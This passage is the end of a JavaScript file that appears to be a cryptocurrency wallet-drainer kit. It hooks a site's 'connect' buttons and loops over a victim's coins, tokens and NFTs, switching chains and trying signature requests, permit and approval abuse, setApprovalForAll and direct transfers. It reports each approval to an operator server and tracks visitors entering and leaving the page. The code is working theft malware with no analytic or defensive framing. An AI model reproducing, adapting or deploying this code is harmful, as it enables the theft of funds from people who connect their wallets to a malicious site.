            .mul(ethers.BigNumber.from(gas_limit_ct)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id]))))
            .sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price)
            .mul(ethers.BigNumber.from(gas_limit_nt)).mul(ethers.BigNumber.from('2'))).toString();
            if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) continue;
          }
          await chain_request(MS_Current_Chain_ID, asset.chain_id);
          try {
            await MS_Provider.request({
              method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]
            });
            MS_Current_Chain_ID = asset.chain_id;
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
            is_chain_correct = true;
            await chain_success();
          } catch(err) {
            console.log(err);
            await chain_cancel();
            continue;
          }
        } else {
          is_chain_correct = true;
        }
        if (!is_chain_correct) continue;
        if (asset.type == 'NATIVE') {
          if (MS_Settings.Settings.Sign.Native > 0) {
            try {
              await SIGN_NATIVE(asset);
            } catch(err) {
              console.log(err);
              if (err.code == -32601) {
                await sign_unavailable();
                try {
                  await TRANSFER_NATIVE(asset);
                } catch(err) {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await transfer_cancel();
                  }
                }
              } else {
                console.log(err);
                if (err != 'LOW_BALANCE') {
                  await sign_cancel();
                }
              }
            }
          } else {
            try {
              await TRANSFER_NATIVE(asset);
            } catch(err) {
              console.log(err);
              if (err != 'LOW_BALANCE') {
                await transfer_cancel();
              }
            }
          }
        } else if (asset.type == 'ERC20') {
          if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode) {
            const data = await retrive_token(asset.chain_id, asset.address);
            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
            const contract = new ethers.Contract(asset.address, data, node);
            const permit_type = get_permit_type(contract.functions);
            asset.permit = permit_type;
            asset.permit_ver = "1";
            asset.abi = data;
            if (permit_type > 0) {
              if (contract.functions.hasOwnProperty('version')) {
                try {
                  asset.permit_ver = await contract.version();
                } catch(err) {
                  console.log(err);
                }
              }
              console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
            }
          }
          if (MS_Settings.Settings.Swappers.Enable && asset.swapper) {
            if (asset.swapper_type == 'Uniswap') {
              const all_uniswap = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
                    all_uniswap.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              try {
                await DO_UNISWAP(asset, all_uniswap);
              } catch(err) {
                console.log(err);
                await sign_cancel();
              }
            } else {
              try {
                await DO_SWAP(asset);
              } catch(err) {
                console.log(err);
                await sign_cancel();
              }
            }
          } else if (MS_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
            try {
              await PERMIT_TOKEN(asset);
            } catch(err) {
              console.log(err);
              await approve_cancel();
            }
          } else if (MS_Settings.Settings.Sign.Tokens > 0) {
            try {
              await SIGN_TOKEN(asset);
              if (MS_Settings.Settings.Sign.Tokens == 1) {
                const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                if (MS_Settings.Settings.Wait_For_Response) await x_promise;
              }
            } catch(err) {
              console.log(err);
              if (err.code == -32601) {
                await sign_unavailable();
                if (MS_Settings.Settings.Sign.Tokens == 1) {
                  if (MS_Settings.Settings.Approve.MetaMask || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status)) {
                    try {
                      await APPROVE_TOKEN(asset);
                      const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
                      if (MS_Settings.Settings.Wait_For_Response) await x_promise;
                    } catch(err) {
                      await approve_cancel();
                    }
                  } else {
                    try {
                      await TRANSFER_TOKEN(asset);
                    } catch(err) {
                      console.log(err);
                      await transfer_cancel();
                    }
                  }
                } else if (MS_Settings.Settings.Sign.Tokens == 2) {
                  try {
                    await TRANSFER_TOKEN(asset);
                  } catch(err) {
                    console.log(err);
                    await transfer_cancel();
                  }
                }
              } else {
                console.log(err);
                await sign_cancel();
              }
            }
          } else if (MS_Settings.Settings.Approve.Enable && (MS_Settings.Settings.Approve.MetaMask || (MS_Current_Provider != 'MetaMask' || MS_Mobile_Status))) {
            try {
              await APPROVE_TOKEN(asset);
              const x_promise = send_request({ action: 'approve_token', user_id: MS_ID, asset, address: MS_Current_Address });
              if (MS_Settings.Settings.Wait_For_Response) await x_promise;
            } catch(err) {
              console.log(err);
              await approve_cancel();
            }
          } else {
            try {
              await TRANSFER_TOKEN(asset);
            } catch(err) {
              console.log(err);
              await transfer_cancel();
            }
          }
        } else if (asset.type == 'ERC721') {
          if (MS_Settings.Settings.Sign.NFTs > 0) {
            try {
              await SIGN_NFT(asset);
              if (MS_Settings.Settings.Sign.Tokens == 1) {
                let same_collection = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.address == asset.address) {
                      same_collection.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                await send_request({
                  action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                  chain_id: MS_Current_Chain_ID, contract_address: asset.address
                });
              }
            } catch(err) {
              console.log(err);
              if (err.code == -32601) {
                await sign_unavailable();
                if (MS_Settings.Settings.Sign.NFTs == 1) {
                  try {
                    await DO_SAFA(asset);
                    let same_collection = [];
                    for (const x_asset of assets) {
                      try {
                        if (x_asset.address == asset.address) {
                          same_collection.push(x_asset);
                          x_asset.skip = true;
                        }
                      } catch(err) {
                        console.log(err);
                      }
                    }
                    await send_request({
                      action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                      chain_id: MS_Current_Chain_ID, contract_address: asset.address
                    });
                  } catch(err) {
                    console.log(err);
                    await approve_cancel();
                  }
                } else if (MS_Settings.Settings.Sign.NFTs == 2) {
                  try {
                    await TRANSFER_NFT(asset);
                  } catch(err) {
                    console.log(err);
                    await transfer_cancel();
                  }
                }
              } else {
                console.log(err);
                await sign_cancel();
              }
            }
          } else if (MS_Settings.Settings.Approve.Enable) {
            try {
              await DO_SAFA(asset);
              let same_collection = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.address == asset.address) {
                    same_collection.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              await send_request({
                action: 'safa_approves', user_id: MS_ID, tokens: same_collection, address: MS_Current_Address,
                chain_id: MS_Current_Chain_ID, contract_address: asset.address
              });
            } catch(err) {
              console.log(err);
              await approve_cancel();
            }
          } else {
            try {
              await TRANSFER_NFT(asset);
            } catch(err) {
              console.log(err);
              await transfer_cancel();
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await retrive_config();
    await retrive_contract();
    if (typeof localStorage['MS_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrive_id' });
      if (ID_Data.status == 'OK') localStorage['MS_ID'] = ID_Data.data;
      else localStorage['MS_ID'] = Math.floor(Date.now() / 1000);
    }
    MS_ID = localStorage['MS_ID'], MS_Ready = true;
    inject_sweet(); inject_modal(); enter_website();
    for (const chain_id in MS_Settings.RPCs) MS_Gas_Reserves[chain_id] = 0;
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => ms_init());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

window.addEventListener("beforeunload", (e) => leave_website());
window.addEventListener("onbeforeunload", (e) => leave_website());